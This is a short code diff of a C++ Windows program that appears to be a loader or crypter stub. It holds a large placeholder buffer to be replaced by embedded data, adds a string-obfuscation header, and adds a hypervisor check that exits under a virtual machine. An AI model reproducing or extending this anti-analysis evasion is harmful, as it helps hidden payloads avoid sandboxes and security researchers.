@@ -1,8 +1,10 @@
 #include <Windows.h>
+#include "xorstr.hpp"
 #include "Anti.h"
 
+
 // Data that will be replaced by RibeyeSpecial, prepare 20bytes for now but will grow
-const char rawData[2097252] = { 'C', 'O', 'C', 'O', 'N', 'U', 'T', 'Z' };
+const char rawData[2097252] = "COCONUTZ";
 
 // Struct that will determine the configuration to run this
 struct Coconut
@@ -24,6 +26,13 @@ struct Coconut
 
 int main()
 {
+
+	if (cpuid_hypervisor_vendor())
+	{
+		printf("bad");
+		return 1;
+	}
+
 	Coconut * settings = (Coconut*)rawData;
 
 	if (settings->antivm)
